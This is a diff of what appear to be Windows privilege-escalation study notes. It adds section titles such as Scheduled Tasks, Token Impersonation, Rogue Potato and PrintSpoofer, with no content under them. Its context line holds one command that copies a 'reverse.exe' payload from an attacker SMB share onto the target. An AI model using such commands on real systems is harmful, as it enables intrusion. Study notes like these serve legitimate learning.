@@ -1464,23 +1464,42 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 <details>
-  <summary></summary>
+  <summary>Scheduled Tasks</summary>
 </details>
 
 <details>
-  <summary></summary>
+  <summary>Insecure GUI Apps</summary>
 </details>
 
 <details>
-  <summary></summary>
+  <summary>Startup Apps</summary>
 </details>
 
 <details>
-  <summary></summary>
+  <summary>Token Impersonation</summary>
+
+
+
+
+
+- <details>
+      <summary>Rogue Potato</summary>
+  </details>
+
+
+- <details>
+      <summary>PrintSpoofer</summary>
+  </details>
+
+
+
+
+
+     
 </details>
 
 <details>
-  <summary></summary>
+  <summary>Privilege Escalation Scripts</summary>
 </details>
 
 
